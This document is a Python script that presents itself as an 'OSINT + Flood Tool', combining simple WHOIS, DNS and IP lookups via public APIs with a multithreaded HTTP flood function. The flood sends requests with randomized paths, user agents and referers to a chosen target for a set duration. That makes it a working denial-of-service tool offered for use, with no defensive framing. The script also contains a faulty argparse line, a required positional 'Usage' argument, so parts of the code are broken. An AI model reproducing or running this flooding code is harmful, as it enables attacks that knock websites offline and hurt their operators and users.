import argparse
import requests
import socket
import time
import os
import random
import string
import threading
import sys

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[91m
 █████╗  ██████╗██╗  ██╗     ██╗     ██╗███╗   ██╗██╗   ██╗
██╔══██╗██╔════╝██║ ██╔╝     ██║     ██║████╗  ██║╚██╗ ██╔╝
███████║██║     █████╔╝█████╗██║     ██║██╔██╗ ██║ ╚████╔╝ 
██╔══██║██║     ██╔═██╗╚════╝██║     ██║██║╚██╗██║  ╚██╔╝  
██║  ██║╚██████╗██║  ██╗     ███████╗██║██║ ╚████║   ██║   
╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
        \033[96mOSINT + FLOOD TOOL ACX - By: qwip. dc(0.5628)
""")

def is_email(s): return "@" in s
def is_ip(s):
    try: socket.inet_aton(s); return True
    except: return False
def is_domain(s): return "." in s and not is_ip(s)

def random_string(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def whois_lookup(domain):
    print("\033[92m[+] WHOIS Lookup")
    try:
        r = requests.get(f"https://api.hackertarget.com/whois/?q={domain}")
        print(r.text)
    except: print("[!] WHOIS failed.")

def dns_lookup(domain):
    print("\033[92m[+] DNS Lookup")
    try:
        r = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}")
        print(r.text)
    except: print("[!] DNS failed.")

def ip_lookup(ip):
    print("\033[92m[+] IP Info")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        print(r.text)
    except: print("[!] IP Info failed.")

def flood(target_url, duration, threads):
    print(f"\033[91m[!] FLOOD LAUNCH >> {target_url} [{threads} threads / {duration}s]")
    stop_time = time.time() + duration

    def attack():
        while time.time() < stop_time:
            try:
                path = "/" + random_string(5)
                headers = {
                    'User-Agent': random_string(16),
                    'Referer': f"https://{random_string(4)}.com"
                }
                requests.get(target_url + path, headers=headers, timeout=3)
                print(f"\033[90m[.] {target_url+path}")
            except: pass

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

    print("\033[92m[*] FLOOD DONE.")

def parse_args():
    parser = argparse.ArgumentParser(description="OSINT + Flood Tool by - qwip (dc: 0.5628")
    parser.add_argument('--target', required=True, help='Target (email, domain, IP, or URL)')
    parser.add_argument('--scan', action='store_true', help='Perform OSINT scan')
    parser.add_argument('--flood', action='store_true', help='Perform HTTP flood')
    parser.add_argument('--duration', type=int, default=60, help='Flood duration in seconds (default=60)')
    parser.add_argument('--threads', type=int, default=50, help='Number of threads for flood (default=50)')
    parser.add_argument('Usage', type=int, default=50, help='python3 osinttoolacxtwin.py --scan --target <ip,address,email')
    return parser.parse_args()

def main():
    print_banner()
    args = parse_args()
    target = args.target

    if args.flood:
        if not target.startswith("http"):
            target = "http://" + target
        flood(target, args.duration, args.threads)
        return

    if args.scan:
        if is_email(target):
            print("\033[93m[!] Email recon not implemented (requires API)")
        elif is_ip(target):
            ip_lookup(target)
        elif is_domain(target):
            whois_lookup(target)
            dns_lookup(target)
        else:
            print("\033[91m[!] Unknown target format.")
        return

    print("\033[94m[!] No action selected. Use --scan or --flood.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Interrupted.")
